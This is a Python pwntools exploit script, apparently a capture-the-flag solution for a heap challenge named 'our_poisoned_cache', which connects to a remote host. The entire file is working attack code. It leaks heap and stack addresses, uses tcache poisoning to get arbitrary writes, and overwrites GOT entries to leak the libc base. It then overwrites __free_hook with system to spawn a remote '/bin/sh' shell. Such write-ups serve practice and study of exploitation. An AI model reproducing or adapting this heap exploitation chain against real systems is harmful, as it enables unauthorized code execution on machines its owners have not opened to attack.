from pwn import *

# r = process('./our_poisoned_cache_patched')
r = remote('103.245.249.76',  32145)
libc = ELF('./libc6_2.31-0ubuntu9.8_amd64.so')
# bin = ELF('./our_poisoned_cache')

# r = process('./our_poisoned_cache')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
bin = ELF('./our_poisoned_cache_patched')
context.clear(os='linux', arch='x86_64', log_level='debug')

def debug():
    gdb.attach(r, '''b*main+204''')

r.recvuntil(b'Heap base is: ')
heap = int(r.recvuntil(b'\n')[:-1], 16)
r.recvuntil(b'Stack address is: ')
stack = int(r.recvuntil(b'\n')[:-1], 16) + 0x38
log.info('Heap base: %#x' % heap)
log.info('Stack: %#x' % stack)

r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(0x404068).encode())
r.send(p64(bin.symbols['main']))

r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(heap+0x2a0).encode())
# r.send(p64(0)+b'\n')

r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(0x404050).encode())
r.send(p64(bin.plt['puts']))

r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(heap+0x2a0).encode())

r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(0x4040a0).encode())
r.send(p64(bin.got['free']))

r.recv(10)
libc.address = u64(r.recv(6).ljust(8, b'\0')) - libc.symbols['free']
log.success('Libc base: %#x' % libc.address)

r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(heap+0x2a0).encode())

r.sendlineafter(b'Where:\n', hex(heap+0x530).encode())
r.sendlineafter(b'What:\n', hex(int.from_bytes(b'/bin/sh\x00', 'little')).encode())
r.send(p64(0))

# debug()
r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(libc.symbols['__free_hook']).encode())
r.send(p64(libc.symbols['system']))

r.interactive()